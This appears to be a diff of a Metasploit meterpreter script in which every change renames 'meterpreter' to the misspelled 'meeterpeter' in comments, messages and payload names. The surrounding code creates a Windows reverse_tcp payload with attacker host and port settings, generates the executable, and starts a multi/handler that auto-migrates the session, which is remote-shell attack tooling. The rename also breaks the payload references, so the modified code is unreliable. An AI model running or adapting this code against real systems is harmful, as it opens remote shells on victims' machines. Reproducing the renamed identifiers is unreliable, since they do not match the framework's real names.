@@ -1,5 +1,5 @@
 ##
-# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# WARNING: Metasploit no longer maintains or accepts meeterpeter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
@@ -35,11 +35,11 @@ end
 if session.sys.config.sysinfo["Architecture"] =~ /wow64/i
   #
   # WOW64 Filesystem Redirection prevents us opening the file directly. To make matters
-  # worse, meterpreter/railgun creates things in a new thread, making it much more
+  # worse, meeterpeter/railgun creates things in a new thread, making it much more
   # difficult to disable via Wow64EnableWow64FsRedirection. Until we can get around this,
   # offer a workaround and error out.
   #
-  print_error("Running against via WOW64 is not supported, try using an x64 meterpreter...")
+  print_error("Running against via WOW64 is not supported, try using an x64 meeterpeter...")
   raise Rex::Script::Completed
 end
 
@@ -113,10 +113,10 @@ tmpdir = envs['TEMP']
 
 # Must have at least one of -c or -u
 if not cmd and not upload_fn
-  print_status("Using default reverse-connect meterpreter payload; -c or -u not specified")
+  print_status("Using default reverse-connect meeterpeter payload; -c or -u not specified")
 
   # Get the exe payload.
-  pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
+  pay = client.framework.payloads.create("windows/meeterpeter/reverse_tcp")
   pay.datastore['LHOST'] = rhost
   pay.datastore['LPORT'] = rport
   raw  = pay.generate
@@ -131,7 +131,7 @@ if not cmd and not upload_fn
 
   #get handler to be ready
   handler = client.framework.exploits.create("multi/handler")
-  handler.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
+  handler.datastore['PAYLOAD'] = "windows/meeterpeter/reverse_tcp"
   handler.datastore['LHOST']   = rhost
   handler.datastore['LPORT']   = rport
   handler.datastore['InitialAutoRunScript'] = "migrate -f"
